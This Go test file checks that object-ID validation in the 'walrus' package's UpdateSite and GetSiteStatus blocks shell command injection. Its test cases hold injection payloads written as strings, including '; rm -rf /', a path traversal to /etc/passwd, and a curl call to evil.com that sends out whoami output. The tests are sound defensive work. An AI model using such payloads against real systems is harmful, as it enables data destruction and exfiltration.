package walrus

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestCommandInjectionObjectID tests for command injection vulnerability in UpdateSite
func TestCommandInjectionObjectID(t *testing.T) {
	// This test proves the RCE vulnerability exists
	tempDir := t.TempDir()

	// Create a malicious object ID that would execute commands
	maliciousObjectID := "; touch /tmp/pwned #"

	// Create empty deploy dir
	deployDir := filepath.Join(tempDir, "deploy")
	if err := os.MkdirAll(deployDir, 0755); err != nil {
		t.Fatal(err)
	}

	// This should FAIL with validation error, not attempt execution
	_, err := UpdateSite(context.Background(), deployDir, maliciousObjectID, 1)

	if err == nil {
		t.Fatal("Expected error for malicious objectID, got nil")
	}

	// The function should validate objectID format BEFORE passing to exec
	if !strings.Contains(err.Error(), "invalid") && !strings.Contains(err.Error(), "format") {
		t.Errorf("Error should mention invalid format, got: %v", err)
	}

	// Check if command injection succeeded (it shouldn't)
	if _, err := os.Stat("/tmp/pwned"); err == nil {
		t.Fatal("CRITICAL: Command injection succeeded! File /tmp/pwned was created")
	}
}

// TestObjectIDValidation tests proper objectID format validation
func TestObjectIDValidation(t *testing.T) {
	tests := []struct {
		name     string
		objectID string
		wantErr  bool
	}{
		{"valid hex with 0x", "0x1234567890abcdef", false},
		{"valid hex without 0x", "1234567890ABCDEF", false},
		{"empty", "", true},
		{"command injection", "; rm -rf /", true},
		{"path traversal", "../../../etc/passwd", true},
		{"newline injection", "valid\n; evil", true},
		{"null byte", "valid\x00evil", true},
		{"spaces", "has spaces", true},
		{"semicolon attack", "0xABC; curl evil.com", true},
		{"pipe attack", "0xABC | whoami", true},
		{"backtick attack", "0xABC`ls`", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test the validation function directly
			err := validateObjectID(tt.objectID)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateObjectID() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// TestGetSiteStatusCommandInjection tests the GetSiteStatus command for injection
func TestGetSiteStatusCommandInjection(t *testing.T) {
	maliciousObjectID := "0xValidPrefix; curl evil.com/exfiltrate?data=$(whoami) #"

	_, err := GetSiteStatus(maliciousObjectID)

	if err == nil {
		t.Error("Expected validation error for malicious objectID")
	}

	// Should fail fast with validation error, not attempt site-builder execution
	if !strings.Contains(err.Error(), "invalid") && !strings.Contains(err.Error(), "format") {
		t.Errorf("Expected invalid format error, got: %v", err)
	}
}
